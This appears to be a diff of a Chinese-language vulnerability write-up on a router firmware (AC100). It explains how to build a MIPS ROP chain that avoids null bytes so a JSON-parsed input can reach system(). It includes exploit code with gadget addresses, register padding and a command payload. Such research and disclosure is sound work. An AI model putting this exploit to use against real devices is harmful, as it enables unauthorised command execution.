@@ -93,7 +93,14 @@ data0 += b"mkdir /12345"
 
 # [](#header-3)rop链构造
 
-此时笔者的目标是 合理地 跳到位于 0x2B4002F0 的 system 函数中(如下图所示，此处未开启栈随机化，因此暂时拿 0x2B4002F0 作为其地址). 
+对于该固件，ROP 链的构造有一点需要注意：由于向该固件输入的字符串首先必须经过各种 json 库处理，因此我们输入的字符串的任何地方 都不能包含字节 \x00 于其中. 否则就会截断整个 json，导致输入不成功.  
+在这种情况下，由于程序静态加载的函数总是自 0x00... 开头，向这类地址跳转需要另找几个 gadget，因此笔者只好优先跳到高地址动态链接的函数，并且该函数包含的 gadget 地址也不能包含 \x00
+
+`一个例子 sub_419BC0 如下所示，由于直接跳转到该函数需要在栈中写入 \x00，因此很难跳到该函数中`  
+![/image/cfac100/3.png](/image/cfac100/13.png)  
+
+万幸的是，extern 的 system 函数加载到地址 0x2B4002F0，如果该地址凑巧包含 \x00 于其中，那又要多找几个 gadget 来匹配他了.  
+那么此时笔者的目标是 合理地 跳到位于 0x2B4002F0 的 system 函数中(如下图所示，此处未开启栈随机化，因此暂时拿 0x2B4002F0 作为其地址). 
 
 ![/image/cfac100/3.png](/image/cfac100/4.png)  
 
@@ -174,7 +181,7 @@ if True:
 
 	data0 += b'A' * 0xf
 	# 字符串地址
-	data0 += (cmd.encode() + b' #').ljust(85, b'A')
+	data0 += ("echo Successfully-Hacked-By-leeya_bug".encode() + b' #').ljust(85, b'A')
 
 	# gadget 2
 	data0 += p32(0x2B2A64D7)
@@ -221,7 +228,7 @@ def Vul4_AC100(host: str, cmd: str) -> None:
 	data0 += b'\x06' * 4 								# s6 
 	data0 += p32(system_addr)					 		# s7 
 	data0 += b'\x08' * 4 								# fa 
-	data0 += p32(gadget_jalr_addr) 						# 第二次 ra 
+	data0 += p32(gadget_jalr_addr) 						# ra 
 
 	data0 += b'A' * 0xf
 	data0 += (cmd.encode() + b' #').ljust(85, b'A')
